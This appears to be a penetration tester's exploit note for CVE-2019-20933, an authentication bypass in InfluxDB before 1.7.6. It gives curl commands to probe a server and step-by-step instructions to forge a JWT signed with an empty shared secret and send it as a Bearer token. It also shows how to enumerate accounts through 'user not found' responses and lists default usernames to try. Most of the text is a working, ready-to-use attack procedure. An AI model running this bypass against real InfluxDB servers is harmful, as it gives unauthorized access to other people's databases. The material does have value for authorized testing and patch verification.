------------------------------------------------------------------
InfluxDB <= v1.7.5 Password bypass vulnerability
https://github.com/influxdata/influxdb/issues/12927

InfluxDB Documentation - Authenticate using jwt tokens
------------------------------------------------------------------
https://docs.influxdata.com/influxdb/v1.7/administration/authentication_and_authorization/#authenticate-using-jwt-tokens


* CVE-2019-20933
InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go
because a JWT token may have an empty SharedSecret (aka shared secret).


Trivial to exploit:
------------------------------------------------------------------

	* Check for Authentication:

		curl http://<host>:<port>/query --data-urlencode 'q=SHOW DATABASES'
		{"error":"unable to parse authentication credentials"}

		curl http://<host>:<port>/query -u 'bla:bla' --data-urlencode 'q=SHOW DATABASES'
		{"error":"authorization failed"}

	* Bypass Auth, Issue request with jwt token (no shared secret)

		1: If enabled, Discover a user name's via the following URL: https://<influx-server-address>:<port>/debug/requests

		2: Create a valid JWT token with the user, an empty secret, and a valid expiry date
		   https://jwt.io/
			header    - {"alg": "HS256", "typ": "JWT"}
			payload   - {"username":"<input user name here>","exp":<exp date in epoch>}
			signature - HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),<leave this field empty>)

		3: Authenticate to the server using the HTTP header: Authorization: Bearer <The generated JWT token>

			curl -s http://<host>:<port>/query --data-urlencode 'q=SHOW DATABASES' --header 'Authorization: Bearer <token>'

	* Enumerate users with no shared secret jwt (user not found returned):

			{"error":"user not found"}

Quick hit usernames:
-----------------------
admin
test
telegraf
telegraf_ro
telegraf_rw
grafana
grafana_ro
grafana_rw

